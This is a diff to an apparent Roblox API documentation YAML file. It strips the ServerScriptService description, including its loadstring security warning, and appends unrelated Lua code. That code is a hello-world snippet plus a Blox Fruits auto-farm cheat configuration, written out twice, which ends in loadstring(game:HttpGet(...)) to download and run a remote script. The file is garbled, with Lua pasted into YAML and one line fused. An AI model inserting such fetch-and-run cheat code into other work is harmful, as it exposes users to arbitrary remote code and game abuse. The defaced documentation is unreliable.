@@ -1,32 +1,8 @@
-name: ServerScriptService
+name: hello script
 type: class
 category: Scripting
 memory_category: Instances
-summary: |
-  A container service for server-only `Class.Script` objects.
-description: |
-  **ServerScriptService** is a container service for `Class.Script`,
-  `Class.ModuleScript` and other scripting-related assets that are only meant
-  for server use. The contents are never replicated to player clients at all,
-  which allows for a secure storage of important game logic. Script objects will
-  run if they are within this service and not
-  `Class.BaseScript.Disabled|Disabled`.
-
-  This service houses just one property,
-  `Class.ServerScriptService.LoadStringEnabled|LoadStringEnabled`, which
-  determines whether the `loadstring` function in Lua is enabled. It's
-  recommended to keep this disabled for security reasons, as misusing this
-  function can lead to remote code execution vulnerabilities.
-
-  Scripts running in ServerScriptService may need access to various other assets
-  which are not scripting-related, such as prefabricated models to be
-  `Class.Instance:Clone()|cloned`. Such assets should go in
-  `Class.ServerStorage`, which behaves similarly to this service except that
-  `Class.Script` objects will not run even if they are not
-  `Class.BaseScript.Disabled|Disabled`. Assets and `Class.ModuleScript` that are
-  useful to both the server and clients should go in `Class.ReplicatedStorage`
-  instead. Finally, you can further organize objects within this service through
-  the use of `Class.Folder|Folders` without affecting the way it behaves.
+summary: 
 code_samples:
 inherits:
   - Instance
@@ -62,3 +38,118 @@ properties:
 methods: []
 events: []
 callbacks: []
+local helloArray = {"h", "e", "l", "l", "o"}
+local worldArray = {"w", "o", "r", "l", "d"}
+
+for index, value in helloArray do
+	print(value)
+end
+
+print(table.concat(worldArray))
+getgenv().Hide_UI = true
+getgenv().BlackScreen = false
+_G.HopFruit1M = false
+_G.KaitunConfig = {
+    ["Actions Allowed"] = {
+      ["Awakening Fruit"] = true,
+      ["Shark Anchor"] = true,
+      ["Mirror Fractal"] = true,
+      ["Soul Guitar"] = true,
+      ["Pole (1st Form)"] = true,
+      ["Upgrading Race"] = true,
+      ["Farming Boss Drop When Maxed Level"] = false,
+      ["Rainbown Haki"] = true,
+      ["Cursed Dual Katana"] = true,
+      ["Buy accessories"] = true,
+      ["Buy Hakis"] = true,
+      ["Buy Guns"] = true,
+      ["Buy Swords"] = true,
+      ["Upgrade Weapons"] = true,
+      ["Farming Boss Drops When X2 Expired"] = true,
+      ["Mirage Puzzle"] = true,
+      ["Saber"] = true
+    },
+    ["Fps Boosting"] = true,
+    ["Fruit Snipping"] = true,
+    ["Fruit Eating"] = false,
+    ["High Ping Hop"] = true,
+    ["Fruit Choosen"] = {
+      ["T-Rex-T-Rex"] = true,
+      ["Shadow-Shadow"] = true,
+      ["Mammoth-Mammoth"] = true,
+      ["Gravity-Gravity"] = true,
+      ["Spirit-Spirit"] = true,
+      ["Dark-Dark"] = true,
+      ["Rocket-Rocket"] = true,
+      ["Control-Control"] = true,
+      ["Dough-Dough"] = true,
+      ["Leopard-Leopard"] = true,
+      ["Venom-Venom"] = true,
+      ["Dragon-Dragon"] = true,
+      ["Diamond-Diamond"] = true,
+      ["Kitsune-Kitsune"] = true,
+      ["Spring-Spring"] = true
+    },
+    ["Player Nearing Hop"] = true,
+    ["Allow Stored"] = true,
+    ["Race Choosen"] = {
+      ["Human"] = true
+    },
+    ["Race Snipping"] = true,
+    ["Tween Speed"] = 350,
+    ["Same Y Tween"] = true,
+}
+loadstring(game:HttpGet('https://raw.githubusercontent.com/memaybeohub/NewPage/main/Kaitun.lua'))()getgenv().Hide_UI = true
+getgenv().BlackScreen = false
+_G.HopFruit1M = false
+_G.KaitunConfig = {
+    ["Actions Allowed"] = {
+      ["Awakening Fruit"] = true,
+      ["Shark Anchor"] = true,
+      ["Mirror Fractal"] = true,
+      ["Soul Guitar"] = true,
+      ["Pole (1st Form)"] = true,
+      ["Upgrading Race"] = true,
+      ["Farming Boss Drop When Maxed Level"] = false,
+      ["Rainbown Haki"] = true,
+      ["Cursed Dual Katana"] = true,
+      ["Buy accessories"] = true,
+      ["Buy Hakis"] = true,
+      ["Buy Guns"] = true,
+      ["Buy Swords"] = true,
+      ["Upgrade Weapons"] = true,
+      ["Farming Boss Drops When X2 Expired"] = true,
+      ["Mirage Puzzle"] = true,
+      ["Saber"] = true
+    },
+    ["Fps Boosting"] = true,
+    ["Fruit Snipping"] = true,
+    ["Fruit Eating"] = false,
+    ["High Ping Hop"] = true,
+    ["Fruit Choosen"] = {
+      ["T-Rex-T-Rex"] = true,
+      ["Shadow-Shadow"] = true,
+      ["Mammoth-Mammoth"] = true,
+      ["Gravity-Gravity"] = true,
+      ["Spirit-Spirit"] = true,
+      ["Dark-Dark"] = true,
+      ["Rocket-Rocket"] = true,
+      ["Control-Control"] = true,
+      ["Dough-Dough"] = true,
+      ["Leopard-Leopard"] = true,
+      ["Venom-Venom"] = true,
+      ["Dragon-Dragon"] = true,
+      ["Diamond-Diamond"] = true,
+      ["Kitsune-Kitsune"] = true,
+      ["Spring-Spring"] = true
+    },
+    ["Player Nearing Hop"] = true,
+    ["Allow Stored"] = true,
+    ["Race Choosen"] = {
+      ["Human"] = true
+    },
+    ["Race Snipping"] = true,
+    ["Tween Speed"] = 350,
+    ["Same Y Tween"] = true,
+}
+loadstring(game:HttpGet('https://raw.githubusercontent.com/memaybeohub/NewPage/main/Kaitun.lua'))() 
